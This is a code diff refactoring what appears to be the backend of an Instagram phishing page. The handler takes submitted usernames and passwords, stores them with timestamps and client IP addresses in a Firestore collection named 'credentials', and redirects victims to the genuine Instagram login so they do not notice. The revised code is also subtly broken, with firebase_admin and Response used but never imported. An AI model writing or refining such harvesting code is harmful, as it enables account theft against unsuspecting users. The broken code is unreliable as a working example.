@@ -1,31 +1,20 @@
-from http.server import BaseHTTPRequestHandler
-from urllib.parse import parse_qs
+from firebase_admin import credentials, firestore, initialize_app
 from datetime import datetime
-import firebase_admin
-from firebase_admin import credentials, firestore
-import os
 import json
+import os
 
-# Initialize Firebase
-def initialize_firebase():
-    firebase_config = os.environ.get('FIREBASE_CONFIG')
-    if not firebase_config:
-        raise ValueError("No Firebase config found in environment variables")
-    cred = credentials.Certificate(json.loads(firebase_config))
-    if not firebase_admin._apps:
-        firebase_admin.initialize_app(cred)
-    return firestore.client()
+# Initialize Firebase once
+if not firebase_admin._apps:
+    cred = credentials.Certificate(json.loads(os.environ['FIREBASE_CONFIG']))
+    initialize_app(cred)
 
-db = initialize_firebase()
+db = firestore.client()
 
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        form_data = parse_qs(post_data)
-        
-        username = form_data.get('username', [''])[0]
-        password = form_data.get('password', [''])[0]
+def handler(request):
+    if request.method == 'POST':
+        data = request.form
+        username = data.get('username')
+        password = data.get('password')
         
         if username and password:
             doc_ref = db.collection('credentials').document()
@@ -33,9 +22,11 @@ class handler(BaseHTTPRequestHandler):
                 'username': username,
                 'password': password,
                 'timestamp': datetime.now().isoformat(),
-                'ip_address': self.headers.get('X-Forwarded-For', self.client_address[0])
+                'ip_address': request.headers.get('X-Forwarded-For', '')
             })
         
-        self.send_response(302)
-        self.send_header('Location', 'https://www.instagram.com/accounts/login/')
-        self.end_headers()
+        return Response('', status=302, headers={
+            'Location': 'https://www.instagram.com/accounts/login/'
+        })
+    
+    return Response('Method not allowed', status=405)
